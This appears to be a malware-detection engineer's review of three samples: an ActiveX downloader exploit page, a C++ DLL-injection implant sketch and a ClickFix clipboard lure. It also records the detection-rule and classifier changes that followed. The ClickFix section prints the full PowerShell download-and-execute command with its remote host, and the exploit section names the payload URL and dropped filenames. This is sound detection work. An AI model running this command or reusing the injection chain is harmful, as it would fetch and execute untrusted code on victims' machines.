# Registry-source second review: 62ade591ff28 / 3c7bafeb6df7 / 36c245addfe2

All three original artifacts are judged **MALICIOUS**. The verdicts describe
likely purpose from the supplied bytes, not successful execution or external
family attribution. There is no supplied installation, authorization, parent
package, or educational/test provenance. Self-descriptive comments are not
independent corroboration. The samples and their judgement markers remain in
the original samples directory, outside this checkout.

## offset-hex-exploit.html — ActiveX/RDS downloader exploit

The outer script evaluates a percent-decoded decoder. Its live arithmetic
sets the separator cursor to zero; the separator cycle is `)WM;UHNRSOUMS;MTIK`.
For each separated hexadecimal token it subtracts 33, converts the result to
a character, and writes the assembled HTML with `document.write`. Dead
redirects and junk arithmetic do not change that path. A bounded Python
reimplementation recovered the complete second stage without executing it.

The recovered page tries thirteen COM class identifiers and several
CreateObject/GetObject argument forms. Once a factory supplies shell
objects, `Go` requests an executable response using synchronous XMLHTTP GET,
writes `responseBody` through a binary ADODB stream, saves it with overwrite
mode 2, then calls Shell.Application.ShellExecute on that path. The URL is
`http://enterinmind.com/check/vers195.php?q=1`; it is evidence, not a rule key.
The first output filename is assembled as `.//..//ie_updates3r.exe`.
The secondary path saves to `C:\\ie_updater.exe`; its standalone `o` raises
ReferenceError before that branch's ShellExecute. `return TRUE` can also
raise after the first branch has already launched. Neither bug removes the
first save-and-launch path. Modern browser/COM restrictions and the missing
response prevent claims about runtime success or final payload identity.

The COM factory probes plus concealed executable delivery, rather than names
or scores, establish the malicious judgement. Added a suspicious offset-hex
reconstruction/document-write profile and a hostile RDS response/save/launch
API combination for the recovered stage. The original exploit and
percent-eval concealment detections are retained.

The engine recovers the percent layer but does not reconstruct this custom
separator/offset stage automatically. Thus the original input has two
hostile traits, below the requested 3–5 goal; the manually recovered page now
has one hostile trait. Factory probing, network acquisition, write and launch
were traced and tested rather than inventing additional hostile outcomes.
Automatic propagation of the custom-decoded stage remains an engine gap.

## agent.cpp — incomplete, self-described Kothamine implant sketch

The code defines a local DLL loader/export resolver and a remote DLL loading
routine. The latter opens a supplied PID, allocates remote memory, writes a
DLL path, resolves LoadLibraryA, and passes that actual resolved address to
CreateRemoteThread with the remote allocation as its argument. This is a real
linked injection mechanism, not merely an API-name collection.

`main` creates a named mutex and returns on ERROR_ALREADY_EXISTS. It expands
an AppData path named MicrosoftEdgeUpdateCore.dll, calls the injector with
**PID zero**, and starts `tailcat.exe forward <tc-prefixed token> 18080:4444`
with SW_HIDE and CREATE_NO_WINDOW. OpenProcess(0) fails, so this shown main
path does not inject into Explorer. Explorer is mentioned in comments; no
PID enumeration is implemented. The DLL loader is never called by main.
There is no implemented Base64 DLL receipt, extraction, drop, plugin execution,
C2 task/response loop, socket connection, Defender exclusion or persistence.
The external DLL and tailcat executable are not included. The peer token's
validity and remote availability have not been established.

The update-named user-profile DLL, injection routine, single-instance guard
and hidden fixed-peer forwarding together make an implant sketch the likely
purpose. A legitimate injection/debugging or teaching context could change
that assessment, but none is supplied. Incomplete source is not evidence of
benign intent, and an intended malicious program need not work to be judged.

Tailcat itself is legitimate dual-use software. Its upstream README documents
ordinary forwarding to development/database services:
https://github.com/tailscale/tailcat#forward-local-ports-to-a-tailcat-server
A provenance-preserving forager fetch of that README is in scratch. Ordinary
forwarding plus hidden-window flags proves neither tasking nor unauthorized
C2. Those old hostile/suspicious claims were replaced by notable forwarding
and launch-clue observations. The generic word `forward` is now a component
source-literal fragment; a comment alone no longer establishes forwarding.
The generic AppData DLL path moved out of DLL sideloading into library paths.
Added the resolved-LoadLibrary remote-thread relationship and mutex guard.

The original has **zero hostile/suspicious traits after correction**. This
falls short of the hostile-coverage goal. The reviewed bytes support dual-use
injection/forwarding capabilities; the supplied implementation does not bind
an operator command channel, an Explorer target or any persistence mechanism.
A general hostile rule would overclaim those facts or key on attacker-chosen
names. The model now calls this benign: that is a reported classifier gap,
not a reason to restore inaccurate C2 traits.

## win-clickfix-downloadstring-loader.js — ClickFix clipboard loader

A Windows User-Agent branch renders a human-verification message plus Win+R,
Ctrl+V and Enter instructions. Non-Windows visitors receive a denial message.
The first pointermove calls navigator.clipboard.writeText with the assembled
command, then unregisters the handler. The command is:

    powershell -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('https://elxxvvx.xyz/f')"

The browser does not launch PowerShell itself. The lure induces the user to
run the clipboard text; browser clipboard permission may prevent the write.
Passive clipboard replacement disguised as verification and remote response
evaluation justify MALICIOUS regardless of whether the victim follows it.
No subsequent payload or persistence is supplied.

Added a hostile staged-response evaluation trait distinct from the existing
lure traits. The normal WebClient/IEX command primitive remains notable,
relocated from direct evaluation to script deployment. A comment saying
`iwr|iex` no longer fires the source-command pipeline observation. Actual
PowerShell pipelines and command literals remain covered. The Windows-only
message moved from lure intent into error-message wording; its composite
consumer still supplies the deception context. Clipboard-near-loader evidence
moved from shell pipelines to script deployment because DownloadString/IEX
has no pipe operator.

## Shared-rule audit and checks

Exact consumers were updated for relocations. Ancestor selectors were audited
for the old tailcat/C2, sideload, direct-eval and shell-pipeline homes. A mere
library path, tool reference, command-text snippet or adjacent clipboard
operation must not qualify as C2, sideloading, direct runtime evaluation or
shell process creation. These ancestor-membership losses are intentional
semantic corrections. The one-consumer writable-executable-path group was
folded into its watchdog consumer with the same two alternatives and the same
required watchdog leg. No rule depends on sample names or campaign hosts.

Run `python3 testdata/registry-source-62ad-3c7b-36c2/check.py` for twelve
positive/negative boundary cases and seven existing controls. They cover
resolved versus unrelated thread entry points, background forwarding versus
a comment, actual versus comment-only pipelines, DLL paths, offset-decoded
HTML versus ordinary document output, and RDS save/launch versus save-only.
Existing ClickFix OS-gate, ClickFix save-dialog, RDS exit-hook and rekeyed RDS
fixtures retain their hostile detections. Existing benign WebClient command
and PowerShell documentation fixtures remain without hostile/suspicious
findings. The background-forward control deliberately reproduced the old
false C2 conviction; that synthetic control supplements the original code
trace, existing consumer review, and upstream tool purpose.

Machine results and original/decoded facts are in the dedicated scratch
folder `acquit-62ad-3c7b-36c2`. `results.json` records counts and model changes.
No original sample is an archive. The percent-decoded child and manually
recovered HTML are reported separately; their findings are not counted twice
as distinct observations in an original file.

## Final comparison

Counts below are hostile/suspicious for the original file, excluding duplicate
observations in decoded children.

| Original | Before H/S | After H/S | Highest-probability ML route class, before → after |
|---|---:|---:|---|
| offset-hex-exploit.html | 2/1 | 2/2 | hostile → hostile |
| agent.cpp | 1/1 | 0/0 | hostile → benign |
| win-clickfix-downloadstring-loader.js | 3/1 | 4/0 | suspicious → hostile |

The automatic percent-decoded HTML child remains 0/0. The manually extracted
second-stage HTML changes from 0/0 to 1/0; its calibrated ML route still says
benign, despite a probability change from 0.73986346 to 0.9997979. That is a
second classifier disagreement, now backed by the new hostile stage rule.
Model v18.18 also reports that its feature specification predates v21.
No accurate attack detection was lost in the original HTML/JavaScript or the
retained existing attack controls. The C++ file loses the unsupported C2
conviction and suspicion of ordinary fixed-peer forwarding; supported
injection, loading, path, mutex and hidden-launch observations remain.

The logged WebClient-command fixture expectation now requires the relocated
notable trait, zero suspicious findings, and a 4–6 score range. Its former
41-point suspicious floor described a command being logged as execution.
